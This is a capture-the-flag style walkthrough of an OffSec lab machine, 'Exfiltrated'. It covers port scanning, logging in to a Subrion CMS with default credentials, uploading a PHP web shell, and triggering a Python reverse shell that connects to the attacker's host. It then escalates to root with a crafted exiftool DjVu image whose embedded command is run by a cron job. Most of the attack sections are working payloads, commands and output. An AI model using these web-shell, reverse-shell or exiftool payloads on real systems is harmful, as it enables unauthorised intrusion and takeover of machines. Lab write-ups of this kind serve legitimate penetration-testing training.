<h2>Recon</h2>

<h3>PortScanning</h3>

>command: sudo nmap -A 192.168.118.163 -p- -v -T4

```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-04 00:00 WAT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 00:00
Completed NSE at 00:00, 0.00s elapsed
Initiating NSE at 00:00
Completed NSE at 00:00, 0.00s elapsed
Initiating NSE at 00:00
Completed NSE at 00:00, 0.00s elapsed
Initiating Ping Scan at 00:00
Scanning 192.168.118.163 [4 ports]
Completed Ping Scan at 00:00, 0.22s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 00:00
Completed Parallel DNS resolution of 1 host. at 00:00, 0.04s elapsed
Initiating SYN Stealth Scan at 00:00
Scanning 192.168.118.163 [65535 ports]
Discovered open port 80/tcp on 192.168.118.163
Discovered open port 22/tcp on 192.168.118.163
SYN Stealth Scan Timing: About 6.10% done; ETC: 00:09 (0:07:57 remaining)
SYN Stealth Scan Timing: About 10.42% done; ETC: 00:10 (0:08:44 remaining)
SYN Stealth Scan Timing: About 15.89% done; ETC: 00:10 (0:08:02 remaining)
SYN Stealth Scan Timing: About 22.11% done; ETC: 00:10 (0:07:27 remaining)
SYN Stealth Scan Timing: About 27.69% done; ETC: 00:10 (0:06:58 remaining)
SYN Stealth Scan Timing: About 33.10% done; ETC: 00:10 (0:06:24 remaining)
SYN Stealth Scan Timing: About 38.43% done; ETC: 00:10 (0:05:52 remaining)
SYN Stealth Scan Timing: About 44.64% done; ETC: 00:10 (0:05:21 remaining)
SYN Stealth Scan Timing: About 53.83% done; ETC: 00:11 (0:04:49 remaining)
SYN Stealth Scan Timing: About 59.44% done; ETC: 00:11 (0:04:17 remaining)
SYN Stealth Scan Timing: About 64.82% done; ETC: 00:11 (0:03:40 remaining)
SYN Stealth Scan Timing: About 71.62% done; ETC: 00:11 (0:03:08 remaining)
SYN Stealth Scan Timing: About 77.09% done; ETC: 00:11 (0:02:32 remaining)
SYN Stealth Scan Timing: About 82.13% done; ETC: 00:11 (0:01:58 remaining)
SYN Stealth Scan Timing: About 87.66% done; ETC: 00:12 (0:01:25 remaining)
SYN Stealth Scan Timing: About 92.65% done; ETC: 00:12 (0:00:50 remaining)
Completed SYN Stealth Scan at 00:12, 694.20s elapsed (65535 total ports)
Initiating Service scan at 00:12
Scanning 2 services on 192.168.118.163
Completed Service scan at 00:12, 6.44s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 192.168.118.163
Retrying OS detection (try #2) against 192.168.118.163
Retrying OS detection (try #3) against 192.168.118.163
Retrying OS detection (try #4) against 192.168.118.163
Retrying OS detection (try #5) against 192.168.118.163
Initiating Traceroute at 00:12
Completed Traceroute at 00:12, 0.16s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 00:12
Completed Parallel DNS resolution of 2 hosts. at 00:12, 0.04s elapsed
NSE: Script scanning 192.168.118.163.
Initiating NSE at 00:12
Completed NSE at 00:12, 5.45s elapsed
Initiating NSE at 00:12
Completed NSE at 00:12, 0.65s elapsed
Initiating NSE at 00:12
Completed NSE at 00:12, 0.00s elapsed
Nmap scan report for 192.168.118.163
Host is up (0.16s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1994b952225ed0f8520d363b448bbcf (RSA)
|   256 0f448badad95b8226af036ac19d00ef3 (ECDSA)
|_  256 32e12a6ccc7ce63e23f4808d33ce9b3a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://exfiltrated.offsec/
| http-robots.txt: 7 disallowed entries 
| /backup/ /cron/? /front/ /install/ /panel/ /tmp/ 
|_/updates/
|_http-favicon: Unknown favicon MD5: 09BDDB30D6AE11E854BFF82ED638542B
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=3/4%OT=22%CT=1%CU=31411%PV=Y%DS=2%DC=T%G=Y%TM=64027EF2
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=102%TI=Z%II=I%TS=9)OPS(O1=M54
OS:EST11NW7%O2=M54EST11NW7%O3=M54ENNT11NW7%O4=M54EST11NW7%O5=M54EST11NW7%O6
OS:=M54EST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF
OS:=Y%T=40%W=FAF0%O=M54ENNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%
OS:Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6
OS:(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RU
OS:D=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 5.761 days (since Sun Feb 26 05:56:28 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=255 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT       ADDRESS
1   159.83 ms 192.168.49.1
2   159.87 ms 192.168.118.163

NSE: Script Post-scanning.
Initiating NSE at 00:12
Completed NSE at 00:12, 0.00s elapsed
Initiating NSE at 00:12
Completed NSE at 00:12, 0.00s elapsed
Initiating NSE at 00:12
Completed NSE at 00:12, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 725.37 seconds
           Raw packets sent: 74221 (3.271MB) | Rcvd: 72104 (2.888MB)
```
From the above scan we can see 2 open ports, port 22 which runs ssh and port 80 which runs http. Our enumeration today will be focused on port 80



<h2>Enumeration</h2>

Navigating to the webpage should get you this

![image](https://user-images.githubusercontent.com/67879936/222852482-c16eb916-651d-4856-9cc4-b7bef01a9e13.png)

We got the "We are having trouble finding that site" error. Looking at the top of the webpage you see ```exfiltrated.offsec```, lets go ahead and add this domain to our ```/etc/hosts``` file

>command: sudo nano /etc/hosts

Now that we've added the domain. lets go back to the webpage

![image](https://user-images.githubusercontent.com/67879936/222853219-d19b70b0-e262-471d-b659-74298abee606.png)

Nice, lets search for directories using dirbuster

>command: dirb http://exfiltrated.com -f

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/Exfiltrated]
└─$ dirb http://exfiltrated.offsec -f

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Mar  4 00:20:23 2023
URL_BASE: http://exfiltrated.offsec/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Fine tunning of NOT_FOUND detection

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://exfiltrated.offsec/ ----
+ http://exfiltrated.offsec/0 (CODE:200|SIZE:1219)                                                                                                                     
+ http://exfiltrated.offsec/crossdomain.xml (CODE:200|SIZE:6)                                                                                                          
+ http://exfiltrated.offsec/favicon.ico (CODE:200|SIZE:23)                                                                                                             
+ http://exfiltrated.offsec/index.php (CODE:200|SIZE:1219)                                                                                                             
+ http://exfiltrated.offsec/robots.txt (CODE:200|SIZE:15)                                                                                                              
+ http://exfiltrated.offsec/server-status (CODE:403|SIZE:283)                                                                                                          
+ http://exfiltrated.offsec/sitemap.xml (CODE:200|SIZE:6)                                                                                                              
+ http://exfiltrated.offsec/updates (CODE:403|SIZE:283)                                                                                                                
+ http://exfiltrated.offsec/web.xml (CODE:200|SIZE:6)                                                                                                                  
                                                                                                                                                                       
-----------------
END_TIME: Sat Mar  4 00:37:24 2023
DOWNLOADED: 4612 - FOUND: 9

```

The only interesting directory here is the  ```/robots.txt``` directory. Lets navigate to that directory

![image](https://user-images.githubusercontent.com/67879936/222858387-3a82cf57-a1e8-444c-a23d-fad15dfd1568.png)

There are seven directories here. The directory we'll focus on will be the ```/panel``` directory. Lets navigate to that directory also

![image](https://user-images.githubusercontent.com/67879936/222858565-22bb81f1-0b98-4546-989b-3e67cfc1c1ac.png)

cool, we found a login page. Also take note of ```Subrion 4.2```, what is subrion? Subrion is a Content Management System (CMS) which allows you to build websites for any purpose.

With this I found default creds for subrion cms

```username:admin```       ```password:admin```

Lets login with these creds

![image](https://user-images.githubusercontent.com/67879936/222859460-8ec7be75-ecfc-47f4-bb6f-9eb7f545e039.png)

Now that we are logged in lets take a look arounf the webpage

![image](https://user-images.githubusercontent.com/67879936/222859651-3cef7549-13bf-498b-a048-fe37d6b001bd.png)

We'll be taking use of this upload page to exploit this webpage.



<h2>Exploitation</h2>

We'll create our malicious php file with extension ```.phar```

payload:```<?php system($_GET['cmd']); ?>```

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/Exfiltrated]
└─$ ls
shell.phar
                                                                                                                                                                        
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/Exfiltrated]
└─$ file shell.phar
shell.phar: PHP script, ASCII text
                                                                                                                                                                        
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/Exfiltrated]
└─$ cat shell.phar 
<?php system($_GET['cmd']); ?>

```
Now, lets go ahead and upload this

![image](https://user-images.githubusercontent.com/67879936/222860687-2ef2f9c8-fea9-4fcd-9fe3-ea16f7740218.png)

To get the path where this shell is uploaded, right click on the uploaded shell and select "Get Info"

![image](https://user-images.githubusercontent.com/67879936/222860779-c1fcf3d8-7404-4cef-a00f-f616eac86f93.png)

![image](https://user-images.githubusercontent.com/67879936/222860814-2cf22565-e0cc-45bf-b9ef-957080cada05.png)

Now that we got where the uploaded shell is, lets go fetch it

Link:http://exfiltrated.offsec/uploads/shell.phar?cmd=id

![image](https://user-images.githubusercontent.com/67879936/222860959-f3b4508c-942a-4afe-95a6-bfdb4905a5c6.png)

Lets grab a python3 reverse shell code so we can get a shell back to our machine

payload:```python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.118",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'```

Using that payload

Link:http://exfiltrated.offsec/uploads/shell.phar?cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.49.118%22,1234));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22/bin/sh%22)%27

Before navigating to that link ensure you have your netcat listener set up

>nc -nvlp 1234

![image](https://user-images.githubusercontent.com/67879936/222861994-8e7a86d0-1151-4967-9457-34c6c5f6cc52.png)

cool, we got a shell as user ```www-data```. Moving on to privilege escalation.




<h2>Privilege Escalation</h2>

I found a cronjob running

>command: cat /etc/crontab

![image](https://user-images.githubusercontent.com/67879936/222864126-9e6346a0-a636-4a6b-83bf-69348ba3651f.png)

Going over to that directory

![image](https://user-images.githubusercontent.com/67879936/222864202-10cff2f5-eb57-4ced-bf59-bfce9ac8a226.png)

What this script does is that it collects EXIF metadata from JPG files in a specified directory. It assumes that the ```exiftool``` command is installed on the system and that it can be accessed from the command line. Additionally, the script requires read access to the directory specified by IMAGES and write access to the directory specified by META

So what we can do is to exploit this exiftool vulnerability. To do this, follow these steps

```
sudo apt-get install -y djvulibre-bin
wget -qO sample.jpg placekitten.com/200
file sample.jpg
printf 'P1 1 1 1' > input.pbm
cjb2 input.pbm mask.djvu
djvumake exploit.djvu Sjbz=mask.djvu
echo -e '(metadata (copyright "\\\n" . `chmod +s /bin/bash` #"))' > input.txt
djvumake exploit.djvu Sjbz=mask.djvu ANTa=input.txt
exiftool '-GeoTiffAsciiParams<=exploit.djvu' sample.jpg
perl -0777 -pe 's/\x87\xb1/\xc5\x1b/g' < sample.jpg > exploit.jpg
```
Follow the steps above

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/Exfiltrated]
└─$ wget -qO sample.jpg placekitten.com/200
                                                                                                                                                                        
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/Exfiltrated]
└─$ file sample.jpg 
sample.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 96x96, segment length 16, comment: "CREATOR: gd-jpeg v1.0 (using IJG JPEG v80), quality = 65", baseline, precision 8, 200x200, components 3
                                                                                                                                                                        
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/Exfiltrated]
└─$ printf 'P1 1 1 1' > input.pbm
                                                                                                                                                                        
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/Exfiltrated]
└─$ cjb2 input.pbm mask.djvu
                                                                                                                                                                        
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/Exfiltrated]
└─$ djvumake exploit.djvu Sjbz=mask.djvu
                                                                                                                                                                        
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/Exfiltrated]
└─$ echo -e '(metadata (copyright "\\\n" . `chmod +s /bin/bash` #"))' > input.txt
                                                                                                                                                                        
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/Exfiltrated]
└─$ djvumake exploit.djvu Sjbz=mask.djvu ANTa=input.txt
                                                                                                                                                                        
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/Exfiltrated]
└─$ exiftool '-GeoTiffAsciiParams<=exploit.djvu' sample.jpg
    1 image files updated
                                                                                                                                                                        
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/Exfiltrated]
└─$ perl -0777 -pe 's/\x87\xb1/\xc5\x1b/g' < sample.jpg > exploit.jpg
                                                                                                                                                                        
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PG/pg_practice/Exfiltrated]
└─$ ls -la
total 52
drwxr-xr-x  2 bl4ck4non bl4ck4non 4096 Mar  4 02:28 .
drwxr-xr-x 17 bl4ck4non bl4ck4non 4096 Mar  4 00:00 ..
-rw-r--r--  1 bl4ck4non bl4ck4non  108 Mar  4 02:28 exploit.djvu
-rw-r--r--  1 bl4ck4non bl4ck4non 6854 Mar  4 02:28 exploit.jpg
-rw-r--r--  1 bl4ck4non bl4ck4non    8 Mar  4 02:27 input.pbm
-rw-r--r--  1 bl4ck4non bl4ck4non   54 Mar  4 02:28 input.txt
-rw-r--r--  1 bl4ck4non bl4ck4non   46 Mar  4 02:28 mask.djvu
-rw-r--r--  1 bl4ck4non bl4ck4non 6854 Mar  4 02:28 sample.jpg
-rw-r--r--  1 bl4ck4non bl4ck4non 6646 Mar  2 17:04 sample.jpg_original
-rw-r--r--  1 bl4ck4non bl4ck4non   31 Mar  4 01:25 shell.phar

```
We upload the ```exploit.jpg``` to the Subrion CMS again, then after lets say 15 seconds our ```/bin/bash``` should have a SUID bit

![image](https://user-images.githubusercontent.com/67879936/222869178-24849002-c742-420d-955b-5e530e717ae3.png)

Going back to our terminal

![image](https://user-images.githubusercontent.com/67879936/222869810-b44d4f60-19d6-4e71-af22-0867ec7b0f18.png)

We became the root user and can view the files meant for the root user.

That will be all for today
<br> <br>
[Back To Home](../../index.md)










































